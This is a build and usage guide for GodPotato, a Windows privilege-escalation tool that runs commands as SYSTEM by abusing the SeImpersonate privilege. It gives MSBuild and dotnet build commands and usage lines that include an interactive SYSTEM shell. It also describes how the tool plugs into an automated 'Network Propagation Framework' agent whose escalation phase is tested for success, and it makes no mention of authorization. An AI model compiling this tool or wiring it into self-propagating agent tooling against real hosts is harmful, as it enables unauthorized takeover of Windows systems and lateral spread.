# GodPotato Build Guide

## Current State

The GodPotato C# source code is available in the workspace at:
```
GodPotato-main/
├── Program.cs
├── GodPotato.csproj
├── NativeAPI/
├── Properties/
└── bin/
    ├── Debug/          (empty, needs compilation)
    └── Release/        (empty, needs compilation)
```

## Prerequisites

To build GodPotato.exe, you need:
- **Visual Studio 2019+** or **MSBuild.exe** (available with any Visual Studio installation)
- **.NET Framework 4.5+** or **.NET SDK**

## Build Instructions

### Option 1: Using Visual Studio IDE (Easiest)

1. Open Visual Studio
2. File → Open → Project/Solution
3. Navigate to `GodPotato-main/GodPotato.csproj`
4. Select Platform: **x86** or **x64** (as needed)
5. Select Configuration: **Release** (for production) or **Debug** (for testing)
6. Build → Build Solution (or press Ctrl+Shift+B)
7. Output: `GodPotato-main/bin/Release/GodPotato.exe` or `Debug/GodPotato.exe`

### Option 2: Using MSBuild Command Line

```batch
# For Release build (64-bit)
msbuild.exe GodPotato-main\GodPotato.csproj /p:Configuration=Release /p:Platform=x64 /p:OutputPath=bin\Release\

# For Debug build (64-bit)
msbuild.exe GodPotato-main\GodPotato.csproj /p:Configuration=Debug /p:Platform=x64 /p:OutputPath=bin\Debug\

# For 32-bit
msbuild.exe GodPotato-main\GodPotato.csproj /p:Configuration=Release /p:Platform=x86 /p:OutputPath=bin\Release\
```

### Option 3: Using PowerShell

```powershell
# Navigate to project directory
cd GodPotato-main

# Build Release
dotnet build --configuration Release

# Or use MSBuild directly
& "C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe" GodPotato.csproj /p:Configuration=Release /p:Platform=x64
```

## Expected Output

After successful build:

### Release Build Path:
```
e:\repos\litmajor\blackroot_agent_v4\GodPotato-main\bin\Release\GodPotato.exe
```

### Debug Build Path:
```
e:\repos\litmajor\blackroot_agent_v4\GodPotato-main\bin\Debug\GodPotato.exe
```

## GodPotato Usage

Once compiled, GodPotato supports several execution methods:

### Basic Commands:
```batch
# Run command as SYSTEM
GodPotato.exe -cmd "cmd.exe /c whoami"

# Interactive shell
GodPotato.exe -cmd "cmd.exe"

# PowerShell execution
GodPotato.exe -cmd "powershell.exe -Command Get-Process"

# Execute with specific COM port
GodPotato.exe -cmd "cmd.exe /c whoami" -ComPort 6666
```

## Integration with Network Propagation Framework

The `escalate_via_godpotato()` method in `agents/privesc.py` will automatically:

1. Check for GodPotato.exe in the following locations (in order):
   - Current working directory
   - System Windows directory
   - `GodPotato-main/bin/Release/GodPotato.exe`
   - `GodPotato-main/bin/Debug/GodPotato.exe`

2. Execute GodPotato with a test command: `whoami`

3. Verify SYSTEM privilege was achieved

4. Return EscalationResult with success status

## Requirements for Phase 5 Escalation

For Phase 5 (Privilege Escalation) tests to pass with 100% success:

- **GodPotato.exe** must be compiled and available in one of the search paths
- **System must have SeImpersonate privilege** (typical for service accounts)
- **Process must be running in Windows environment** (not Windows Subsystem for Linux)

## troubleshooting

### GodPotato.exe not found
- Verify build completed successfully
- Check `GodPotato-main/bin/Release/` or `Debug/` directories
- Ensure correct platform (x86 vs x64) matches your system
- Move compiled GodPotato.exe to project root directory as fallback

### Build fails with missing dependencies
- Update .NET Framework or .NET SDK
- Restore NuGet packages: `nuget restore GodPotato-main/GodPotato.csproj`
- Clean and rebuild: `msbuild GodPotato-main/GodPotato.csproj /t:Clean /t:Build`

### SeImpersonate privilege not available
- Run service account context (e.g., AppPool identity, Windows Service)
- Normal user processes typically do NOT have SeImpersonate
- Use `whoami /priv` to verify available privileges

## References

- GodPotato GitHub: https://github.com/BeichenDream/GodPotato
- MITRE ATT&CK T1134.002: Access Token Manipulation → Create Process with Token
- SeImpersonate Privilege Documentation: https://docs.microsoft.com/windows/win32/secauthz/privilege-constants
